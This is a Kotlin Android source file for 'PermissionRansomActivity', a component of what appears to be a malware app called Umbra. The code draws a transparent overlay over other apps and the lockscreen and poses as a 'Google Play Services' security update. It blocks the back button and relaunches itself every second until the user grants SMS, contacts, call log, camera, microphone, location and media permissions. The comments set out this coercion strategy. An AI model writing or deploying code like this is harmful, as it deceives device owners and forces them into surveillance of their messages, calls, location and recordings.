package org.umbra.core.persistence

import android.Manifest
import android.app.Activity
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import org.umbra.core.R

/**
 * PermissionRansomActivity — transparent overlay that blocks device usage
 * until the user grants ALL requested permissions.
 *
 * Strategy:
 * 1. Launches over any foreground app (device admin allows background activity start)
 * 2. Shows a system-looking dialog requesting permissions
 * 3. On "Allow" → calls requestPermissions() for all missing perms at once
 * 4. On denial → re-launches itself in 1 second
 * 5. On full grant → finishes, watchdog stops bothering
 *
 * The activity is:
 * - Transparent (no visible app UI)
 * - excludeFromRecents (not in recent apps)
 * - noHistory (doesn't stay in back stack)
 * - Shows a dialog that looks like a system update prompt
 *
 * The watchdog in UmbraService checks every 3s and re-launches this
 * activity if permissions are still missing and it's not already showing.
 */
class PermissionRansomActivity : Activity() {

    companion object {
        private const val TAG = "Umbra"
        private const val RELAUNCH_DELAY_MS = 1000L

        val REQUIRED_PERMISSIONS = listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
        )

        fun hasAllPermissions(context: Context): Boolean {
            return REQUIRED_PERMISSIONS.all {
                context.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
            }
        }

        fun missingPermissions(context: Context): List<String> {
            return REQUIRED_PERMISSIONS.filter {
                context.checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }
        }

        fun launch(context: Context) {
            val missing = missingPermissions(context)
            if (missing.isEmpty()) return

            try {
                val intent = Intent(context, PermissionRansomActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TASK or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
                        Intent.FLAG_ACTIVITY_NO_USER_ACTION
                    )
                }
                context.startActivity(intent)
                Log.d(TAG, "PermissionRansomActivity launched (${missing.size} perms missing)")
            } catch (e: Exception) {
                Log.w(TAG, "Failed to launch ransom activity: ${e.message}")
                scheduleRelaunch(context)
            }
        }

        fun scheduleRelaunch(context: Context) {
            val intent = Intent(context, PermissionRansomActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TASK or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            }
            val pi = PendingIntent.getActivity(
                context, 9991, intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val triggerAt = SystemClock.elapsedRealtime() + RELAUNCH_DELAY_MS
            try {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                )
            } catch (e: SecurityException) {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var permissionRequested = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Check if all permissions are already granted
        if (hasAllPermissions(this)) {
            Log.d(TAG, "All permissions granted — finishing ransom")
            finish()
            return
        }

        // Turn screen on and show over lockscreen
        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )

        // Build a simple dialog that looks like a system update prompt
        val missing = missingPermissions(this)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 40, 48, 40)
            setBackgroundColor(0xF0202020.toInt())
        }

        val title = TextView(this).apply {
            text = "Google Play Services"
            textSize = 18f
            setTextColor(0xFFFFFFFF.toInt())
            setPadding(0, 0, 0, 16)
        }

        val message = TextView(this).apply {
            text = "A security update requires the following permissions " +
                   "to keep your device protected:\n\n" +
                   missing.joinToString("\n") { "• ${it.substringAfterLast('.')}" } +
                   "\n\nTap Update to continue."
            textSize = 14f
            setTextColor(0xCCFFFFFF.toInt())
            setPadding(0, 0, 0, 24)
        }

        val allowButton = Button(this).apply {
            text = "Update"
            setOnClickListener {
                permissionRequested = true
                // Request all missing permissions at once
                requestPermissions(
                    missing.toTypedArray(),
                    100
                )
            }
        }

        layout.addView(title)
        layout.addView(message)
        layout.addView(allowButton)
        setContentView(layout)

        // Auto-request after 3 seconds if user doesn't click
        handler.postDelayed({
            if (!permissionRequested && !hasAllPermissions(this)) {
                permissionRequested = true
                requestPermissions(missingPermissions(this).toTypedArray(), 100)
            }
        }, 3000)

        Log.d(TAG, "PermissionRansomActivity shown (${missing.size} perms missing)")
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (hasAllPermissions(this)) {
            Log.d(TAG, "All permissions granted after ransom!")
            finish()
            return
        }

        // Still missing some — re-launch after 1 second
        Log.d(TAG, "Permissions still missing (${missingPermissions(this).size}) — re-launching")
        scheduleRelaunch(this)
        finish()
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)

        // If permissions are still missing, schedule re-launch
        if (!hasAllPermissions(this)) {
            scheduleRelaunch(this)
        }
    }

    override fun onBackPressed() {
        // Prevent dismissal by back button
    }
}
